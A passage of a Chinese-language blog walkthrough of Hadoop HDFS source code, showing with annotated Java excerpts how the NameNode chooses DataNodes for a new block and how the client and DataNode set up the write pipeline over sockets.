选择块存储位置</span></span><br><span class="line">  DatanodeStorageInfo[] targets = FSDirWriteFileOp.chooseTargetForNewBlock(</span><br><span class="line">      blockManager, src, excludedNodes, favoredNodes, flags, r);</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">return</span> lb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> DatanodeStorageInfo[] chooseTargetForNewBlock(</span><br><span class="line">    BlockManager bm, String src, DatanodeInfo[] excludedNodes,</span><br><span class="line">    String[] favoredNodes, EnumSet&lt;AddBlockFlag&gt; flags,</span><br><span class="line">    ValidateAddBlockResult r) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">return</span> bm.chooseTarget4NewBlock(src, r.numTargets, clientNode,</span><br><span class="line">                                  excludedNodesSet, r.blockSize,</span><br><span class="line">                                  favoredNodesList, r.storagePolicyID,</span><br><span class="line">                                  r.blockType, r.ecPolicy, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> DatanodeStorageInfo[] chooseTarget4NewBlock(... ...</span><br><span class="line">  ) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  ... ...</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">final</span> DatanodeStorageInfo[] targets = blockplacement.chooseTarget(src,</span><br><span class="line">      numOfReplicas, client, excludedNodes, blocksize, </span><br><span class="line">      favoredDatanodeDescriptors, storagePolicy, flags);</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">return</span> targets;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DatanodeStorageInfo[] chooseTarget(String src,</span><br><span class="line">    <span class="keyword">int</span> numOfReplicas, Node writer,</span><br><span class="line">    Set&lt;Node&gt; excludedNodes,</span><br><span class="line">    <span class="keyword">long</span> blocksize,</span><br><span class="line">    List&lt;DatanodeDescriptor&gt; favoredNodes,</span><br><span class="line">    BlockStoragePolicy storagePolicy,</span><br><span class="line">    EnumSet&lt;AddBlockFlag&gt; flags) &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> chooseTarget(src, numOfReplicas, writer, </span><br><span class="line">      <span class="keyword">new</span> ArrayList&lt;DatanodeStorageInfo&gt;(numOfReplicas), <span class="keyword">false</span>,</span><br><span class="line">      excludedNodes, blocksize, storagePolicy, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> DatanodeStorageInfo[] chooseTarget(String srcPath,</span><br><span class="line">    <span class="keyword">int</span> numOfReplicas,</span><br><span class="line">    Node writer,</span><br><span class="line">    List&lt;DatanodeStorageInfo&gt; chosen,</span><br><span class="line">    <span class="keyword">boolean</span> returnChosenNodes,</span><br><span class="line">    Set&lt;Node&gt; excludedNodes,</span><br><span class="line">    <span class="keyword">long</span> blocksize,</span><br><span class="line">    BlockStoragePolicy storagePolicy,</span><br><span class="line">EnumSet&lt;AddBlockFlag&gt; flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找chooseTarget实现类BlockPlacementPolicyDefault.java</span></span><br><span class="line"><span class="keyword">public</span> DatanodeStorageInfo[] chooseTarget(String srcPath,</span><br><span class="line">    <span class="keyword">int</span> numOfReplicas,</span><br><span class="line">    Node writer,</span><br><span class="line">    List&lt;DatanodeStorageInfo&gt; chosenNodes,</span><br><span class="line">    <span class="keyword">boolean</span> returnChosenNodes,</span><br><span class="line">    Set&lt;Node&gt; excludedNodes,</span><br><span class="line">    <span class="keyword">long</span> blocksize,</span><br><span class="line">    <span class="keyword">final</span> BlockStoragePolicy storagePolicy,</span><br><span class="line">    EnumSet&lt;AddBlockFlag&gt; flags) &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> chooseTarget(numOfReplicas, writer, chosenNodes, returnChosenNodes,</span><br><span class="line">      excludedNodes, blocksize, storagePolicy, flags, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> DatanodeStorageInfo[] chooseTarget(<span class="keyword">int</span> numOfReplicas,</span><br><span class="line">  Node writer,</span><br><span class="line">  List&lt;DatanodeStorageInfo&gt; chosenStorage,</span><br><span class="line">  <span class="keyword">boolean</span> returnChosenNodes,</span><br><span class="line">  Set&lt;Node&gt; excludedNodes,</span><br><span class="line">  <span class="keyword">long</span> blocksize,</span><br><span class="line">  <span class="keyword">final</span> BlockStoragePolicy storagePolicy,</span><br><span class="line">  EnumSet&lt;AddBlockFlag&gt; addBlockFlags,</span><br><span class="line">  EnumMap&lt;StorageType, Integer&gt; sTypes) &#123;</span><br><span class="line">  … …</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">int</span>[] result = getMaxNodesPerRack(chosenStorage.size(), numOfReplicas);</span><br><span class="line">  numOfReplicas = result[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">int</span> maxNodesPerRack = result[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">for</span> (DatanodeStorageInfo storage : chosenStorage) &#123;</span><br><span class="line">    <span class="comment">// add localMachine and related nodes to excludedNodes</span></span><br><span class="line">  <span class="comment">// 获取不可用的DN</span></span><br><span class="line">    addToExcludedNodes(storage.getDatanodeDescriptor(), excludedNodes);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  List&lt;DatanodeStorageInfo&gt; results = <span class="keyword">null</span>;</span><br><span class="line">  Node localNode = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">boolean</span> avoidStaleNodes = (stats != <span class="keyword">null</span></span><br><span class="line">      &amp;&amp; stats.isAvoidingStaleDataNodesForWrite());</span><br><span class="line">  <span class="comment">//   </span></span><br><span class="line">  <span class="keyword">boolean</span> avoidLocalNode = (addBlockFlags != <span class="keyword">null</span></span><br><span class="line">      &amp;&amp; addBlockFlags.contains(AddBlockFlag.NO_LOCAL_WRITE)</span><br><span class="line">      &amp;&amp; writer != <span class="keyword">null</span></span><br><span class="line">      &amp;&amp; !excludedNodes.contains(writer));</span><br><span class="line">  <span class="comment">// Attempt to exclude local node if the client suggests so. If no enough</span></span><br><span class="line">  <span class="comment">// nodes can be obtained, it falls back to the default block placement</span></span><br><span class="line">  <span class="comment">// policy.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 有数据正在写，避免都写入本地</span></span><br><span class="line">  <span class="keyword">if</span> (avoidLocalNode) &#123;</span><br><span class="line">    results = <span class="keyword">new</span> ArrayList&lt;&gt;(chosenStorage);</span><br><span class="line">    Set&lt;Node&gt; excludedNodeCopy = <span class="keyword">new</span> HashSet&lt;&gt;(excludedNodes);</span><br><span class="line">    <span class="keyword">if</span> (writer != <span class="keyword">null</span>) &#123;</span><br><span class="line">      excludedNodeCopy.add(writer);</span><br><span class="line">    &#125;</span><br><span class="line">    localNode = chooseTarget(numOfReplicas, writer,</span><br><span class="line">        excludedNodeCopy, blocksize, maxNodesPerRack, results,</span><br><span class="line">        avoidStaleNodes, storagePolicy,</span><br><span class="line">        EnumSet.noneOf(StorageType<span class="class">.<span class="keyword">class</span>), <span class="title">results</span>.<span class="title">isEmpty</span>(), <span class="title">sTypes</span>)</span>;</span><br><span class="line">    <span class="keyword">if</span> (results.size() &lt; numOfReplicas) &#123;</span><br><span class="line">      <span class="comment">// not enough nodes; discard results and fall back</span></span><br><span class="line">      results = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results == <span class="keyword">null</span>) &#123;</span><br><span class="line">    results = <span class="keyword">new</span> ArrayList&lt;&gt;(chosenStorage);</span><br><span class="line">  <span class="comment">// 真正的选择DN节点</span></span><br><span class="line">    localNode = chooseTarget(numOfReplicas, writer, excludedNodes,</span><br><span class="line">        blocksize, maxNodesPerRack, results, avoidStaleNodes,</span><br><span class="line">        storagePolicy, EnumSet.noneOf(StorageType<span class="class">.<span class="keyword">class</span>), <span class="title">results</span>.<span class="title">isEmpty</span>(),</span></span><br><span class="line"><span class="class">        <span class="title">sTypes</span>)</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!returnChosenNodes) &#123;  </span><br><span class="line">    results.removeAll(chosenStorage);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// sorting nodes to form a pipeline</span></span><br><span class="line">  <span class="keyword">return</span> getPipeline(</span><br><span class="line">      (writer != <span class="keyword">null</span> &amp;&amp; writer <span class="keyword">instanceof</span> DatanodeDescriptor) ? writer</span><br><span class="line">          : localNode,</span><br><span class="line">      results.toArray(<span class="keyword">new</span> DatanodeStorageInfo[results.size()]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Node <span class="title">chooseTarget</span><span class="params">(<span class="keyword">int</span> numOfReplicas,</span></span></span><br><span class="line"><span class="function"><span class="params">   ... ...)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">   writer = chooseTargetInOrder(numOfReplicas, writer, excludedNodes, blocksize,</span><br><span class="line">          maxNodesPerRack, results, avoidStaleNodes, newBlock, storageTypes);</span><br><span class="line">   ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Node <span class="title">chooseTargetInOrder</span><span class="params">(<span class="keyword">int</span> numOfReplicas, </span></span></span><br><span class="line"><span class="function"><span class="params">                               Node writer,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">final</span> Set&lt;Node&gt; excludedNodes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">final</span> <span class="keyword">long</span> blocksize,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">final</span> <span class="keyword">int</span> maxNodesPerRack,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">final</span> List&lt;DatanodeStorageInfo&gt; results,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">final</span> <span class="keyword">boolean</span> avoidStaleNodes,</span></span></span><br><span class="line"><span class="function"><span class="params">                               <span class="keyword">final</span> <span class="keyword">boolean</span> newBlock,</span></span></span><br><span class="line"><span class="function"><span class="params">                               EnumMap&lt;StorageType, Integer&gt; storageTypes)</span></span></span><br><span class="line"><span class="function">                               <span class="keyword">throws</span> NotEnoughReplicasException </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">int</span> numOfResults = results.size();</span><br><span class="line">  <span class="keyword">if</span> (numOfResults == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// 第一个块存储在当前节点</span></span><br><span class="line">    DatanodeStorageInfo storageInfo = chooseLocalStorage(writer,</span><br><span class="line">        excludedNodes, blocksize, maxNodesPerRack, results, avoidStaleNodes,</span><br><span class="line">        storageTypes, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    writer = (storageInfo != <span class="keyword">null</span>) ? storageInfo.getDatanodeDescriptor()</span><br><span class="line">                                   : <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (--numOfReplicas == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> writer;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span> DatanodeDescriptor dn0 = results.get(<span class="number">0</span>).getDatanodeDescriptor();</span><br><span class="line">  <span class="comment">// 第二个块存储在另外一个机架</span></span><br><span class="line">  <span class="keyword">if</span> (numOfResults &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">    chooseRemoteRack(<span class="number">1</span>, dn0, excludedNodes, blocksize, maxNodesPerRack,</span><br><span class="line">        results, avoidStaleNodes, storageTypes);</span><br><span class="line">    <span class="keyword">if</span> (--numOfReplicas == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> writer;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (numOfResults &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">final</span> DatanodeDescriptor dn1 = results.get(<span class="number">1</span>).getDatanodeDescriptor();</span><br><span class="line">  <span class="comment">// 如果第一个和第二个在同一个机架，那么第三个放在其他机架</span></span><br><span class="line">    <span class="keyword">if</span> (clusterMap.isOnSameRack(dn0, dn1)) &#123;</span><br><span class="line">      chooseRemoteRack(<span class="number">1</span>, dn0, excludedNodes, blocksize, maxNodesPerRack,</span><br><span class="line">          results, avoidStaleNodes, storageTypes);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (newBlock)&#123;</span><br><span class="line">    <span class="comment">// 如果是新块，和第二个块存储在同一个机架</span></span><br><span class="line">      chooseLocalRack(dn1, excludedNodes, blocksize, maxNodesPerRack,</span><br><span class="line">          results, avoidStaleNodes, storageTypes);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果不是新块，放在当前机架</span></span><br><span class="line">      chooseLocalRack(writer, excludedNodes, blocksize, maxNodesPerRack,</span><br><span class="line">          results, avoidStaleNodes, storageTypes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (--numOfReplicas == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> writer;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  chooseRandom(numOfReplicas, NodeBase.ROOT, excludedNodes, blocksize,</span><br><span class="line">      maxNodesPerRack, results, avoidStaleNodes, storageTypes);</span><br><span class="line">  <span class="keyword">return</span> writer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-建立管道之Socket发送">3.3 建立管道之Socket发送</h3><p>点击DataStreamer的nextBlockOutputStream</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> LocatedBlock <span class="title">nextBlockOutputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  LocatedBlock lb;</span><br><span class="line">  DatanodeInfo[] nodes;</span><br><span class="line">  StorageType[] nextStorageTypes;</span><br><span class="line">  String[] nextStorageIDs;</span><br><span class="line">  <span class="keyword">int</span> count = dfsClient.getConf().getNumBlockWriteRetry();</span><br><span class="line">  <span class="keyword">boolean</span> success;</span><br><span class="line">  <span class="keyword">final</span> ExtendedBlock oldBlock = block.getCurrentBlock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    errorState.resetInternalError();</span><br><span class="line">    lastException.clear();</span><br><span class="line"></span><br><span class="line">    DatanodeInfo[] excluded = getExcludedNodes();</span><br><span class="line">  <span class="comment">// 向NN获取向哪个DN写数据</span></span><br><span class="line">    lb = locateFollowingBlock(</span><br><span class="line">        excluded.length &gt; <span class="number">0</span> ? excluded : <span class="keyword">null</span>, oldBlock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建管道</span></span><br><span class="line">    success = createBlockOutputStream(nodes, nextStorageTypes, nextStorageIDs,</span><br><span class="line">          <span class="number">0L</span>, <span class="keyword">false</span>);</span><br><span class="line">    … …</span><br><span class="line">  &#125; <span class="keyword">while</span> (!success &amp;&amp; --count &gt;= <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Unable to create new block."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> lb;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">createBlockOutputStream</span><span class="params">(DatanodeInfo[] nodes,</span></span></span><br><span class="line"><span class="function"><span class="params">      StorageType[] nodeStorageTypes, String[] nodeStorageIDs,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">long</span> newGS, <span class="keyword">boolean</span> recoveryFlag)</span> </span>&#123;</span><br><span class="line">    ... ...</span><br><span class="line">  <span class="comment">// 和DN创建socket</span></span><br><span class="line">  s = createSocketForPipeline(nodes[<span class="number">0</span>], nodes.length, dfsClient);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取输出流，用于写数据到DN</span></span><br><span class="line">  OutputStream unbufOut = NetUtils.getOutputStream(s, writeTimeout);</span><br><span class="line">  <span class="comment">// 获取输入流，用于读取写数据到DN的结果</span></span><br><span class="line">    InputStream unbufIn = NetUtils.getInputStream(s, readTimeout);</span><br><span class="line">  </span><br><span class="line">    IOStreamPair saslStreams = dfsClient.saslClient.socketSend(s,</span><br><span class="line">        unbufOut, unbufIn, dfsClient, accessToken, nodes[<span class="number">0</span>]);</span><br><span class="line">    unbufOut = saslStreams.out;</span><br><span class="line">    unbufIn = saslStreams.in;</span><br><span class="line">    out = <span class="keyword">new</span> DataOutputStream(<span class="keyword">new</span> BufferedOutputStream(unbufOut,</span><br><span class="line">        DFSUtilClient.getSmallBufferSize(dfsClient.getConfiguration())));</span><br><span class="line">    blockReplyStream = <span class="keyword">new</span> DataInputStream(unbufIn);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 发送数据</span></span><br><span class="line">  <span class="keyword">new</span> Sender(out).writeBlock(blockCopy, nodeStorageTypes[<span class="number">0</span>], accessToken,</span><br><span class="line">            dfsClient.clientName, nodes, nodeStorageTypes, <span class="keyword">null</span>, bcs,</span><br><span class="line">            nodes.length, block.getNumBytes(), bytesSent, newGS,</span><br><span class="line">            checksum4WriteBlock, cachingStrategy.get(), isLazyPersistFile,</span><br><span class="line">            (targetPinnings != <span class="keyword">null</span> &amp;&amp; targetPinnings[<span class="number">0</span>]), targetPinnings,</span><br><span class="line">            nodeStorageIDs[<span class="number">0</span>], nodeStorageIDs);</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeBlock</span><span class="params">(... ...)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">  send(out, Op.WRITE_BLOCK, proto.build());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-建立管道之Socket接收">3.4 建立管道之Socket接收</h3><p>全局查找DataXceiverServer.java，在该类中查找run方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  Peer peer = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">while</span> (datanode.shouldRun &amp;&amp; !datanode.shutdownForUpgrade) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 接收socket的请求</span></span><br><span class="line">      peer = peerServer.accept();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Make sure the xceiver count is not exceeded</span></span><br><span class="line">      <span class="keyword">int</span> curXceiverCount = datanode.getXceiverCount();</span><br><span class="line">      <span class="keyword">if</span> (curXceiverCount &gt; maxXceiverCount) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Xceiver count "</span> + curXceiverCount</span><br><span class="line">            + <span class="string">" exceeds the limit of concurrent xcievers: "</span></span><br><span class="line">            + maxXceiverCount);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">// 客户端每发送一个block，都启动一个DataXceiver去处理block</span></span><br><span class="line">      <span class="keyword">new</span> Daemon(datanode.threadGroup,</span><br><span class="line">          DataXceiver.create(peer, datanode, <span class="keyword">this</span>))</span><br><span class="line">          .start();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SocketTimeoutException ignored) &#123;</span><br><span class="line">      ... ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击DataXceiver（线程），查找run方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> opsProcessed = <span class="number">0</span>;</span><br><span class="line">  Op op = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">      xceiver = Thread.currentThread();</span><br><span class="line">    &#125;</span><br><span class="line">    dataXceiverServer.addPeer(peer, Thread.currentThread(), <span class="keyword">this</span>);</span><br><span class="line">    peer.setWriteTimeout(datanode.getDnConf().socketWriteTimeout);</span><br><span class="line">    InputStream input = socketIn;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      IOStreamPair saslStreams = datanode.saslServer.receive(peer, socketOut,</span><br><span class="line">        socketIn, datanode.getXferAddress().getPort(),</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">super</span>.initialize(<span class="keyword">new</span> DataInputStream(input));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      updateCurrentThreadName(<span class="string">"Waiting for operation #"</span> + (opsProcessed + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (opsProcessed != <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">assert</span> dnConf.socketKeepaliveTimeout &gt; <span class="number">0</span>;</span><br><span class="line">          peer.setReadTimeout(dnConf.socketKeepaliveTimeout);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          peer.setReadTimeout(dnConf.socketTimeout);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// 读取这次数据的请求类型</span></span><br><span class="line">        op = readOp();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedIOException ignored) &#123;</span><br><span class="line">        <span class="comment">// Time out while we wait for client rpc</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (EOFException | ClosedChannelException e) &#123;</span><br><span class="line">        <span class="comment">// Since we optimistically expect the next op, it's quite normal to</span></span><br><span class="line">        <span class="comment">// get EOF here.</span></span><br><span class="line">        LOG.debug(<span class="string">"Cached &#123;&#125; closing after &#123;&#125; ops.  "</span> +</span><br><span class="line">            <span class="string">"This message is usually benign."</span>, peer, opsProcessed);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException err) &#123;</span><br><span class="line">        incrDatanodeNetworkErrors();</span><br><span class="line">        <span class="keyword">throw</span> err;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// restore normal timeout</span></span><br><span class="line">      <span class="keyword">if</span> (opsProcessed != <span class="number">0</span>) &#123;</span><br><span class="line">        peer.setReadTimeout(dnConf.socketTimeout);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      opStartTime = monotonicNow();</span><br><span class="line">    <span class="comment">// 根据操作类型处理我们的数据</span></span><br><span class="line">      processOp(op);</span><br><span class="line">      ++opsProcessed;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((peer != <span class="keyword">null</span>) &amp;&amp;</span><br><span class="line">        (!peer.isClosed() &amp;&amp; dnConf.socketKeepaliveTimeout &gt; <span class="number">0</span>));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">    ... ... </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">processOp</span><span class="params">(Op op)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(op) &#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">case</span> WRITE_BLOCK:</span><br><span class="line">    opWriteBlock(in);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Unknown op "</span> + op + <span class="string">" in data stream"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">opWriteBlock</span><span class="params">(DataInputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> OpWriteBlockProto proto = OpWriteBlockProto.parseFrom(vintPrefixed(in));</span><br><span class="line">  <span class="keyword">final</span> DatanodeInfo[] targets = PBHelperClient.convert(proto.getTargetsList());</span><br><span class="line">  TraceScope traceScope = continueTraceSpan(proto.getHeader(),</span><br><span class="line">      proto.getClass().getSimpleName());</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    writeBlock(PBHelperClient.convert(proto.getHeader().getBaseHeader().getBlock()),</span><br><span class="line">        PBHelperClient.convertStorageType(proto.getStorageType()),</span><br><span class="line">        